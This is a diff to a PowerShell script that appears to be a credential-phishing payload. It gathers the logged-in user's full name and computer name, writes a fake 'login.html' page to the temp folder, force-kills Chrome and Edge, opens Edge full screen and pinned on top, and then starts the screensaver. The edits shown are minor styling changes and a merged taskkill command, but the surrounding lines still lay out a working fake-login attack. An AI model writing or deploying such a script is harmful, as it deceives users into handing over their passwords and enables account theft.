@@ -1,3 +1,4 @@
+
 # GATHER SYSTEM AND USER INFO
 $u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
 $c = $env:COMPUTERNAME
@@ -114,7 +115,7 @@ $h2 = @"
       width: 300px;
       height: 35px;
       color: white;
-      background-color: rgba(96, 96, 96, 0.2);
+      background-color: rgba(64, 64, 64, 0.3);
       border: 1px solid #e6e6e6;
       padding: 5px;
       text-align: Left;
@@ -124,7 +125,7 @@ $h2 = @"
     color: #e6e6e6;
     }
     .input-box:not(:focus) {
-    border-bottom: rgba(96, 96, 96, 0.2);
+    border-bottom: rgba(64, 64, 64, 0.3);
     border: 1px solid #e6e6e6;
     }
 
@@ -221,8 +222,7 @@ $p2 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "login.html")
 $h2 | Out-File -Encoding UTF8 -FilePath $p2
 
 # KILL ANY BROWSERS (interfere with "Maximazed" argument)
-Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
-Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
+Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe", "/IM", "msedge.exe" -NoNewWindow -Wait
 Sleep -Milliseconds 250
 
 # START EDGE IN FULLSCREEN
@@ -249,3 +249,4 @@ Sleep -Milliseconds 250
 $null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
 Sleep -Milliseconds 750
 $black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
+
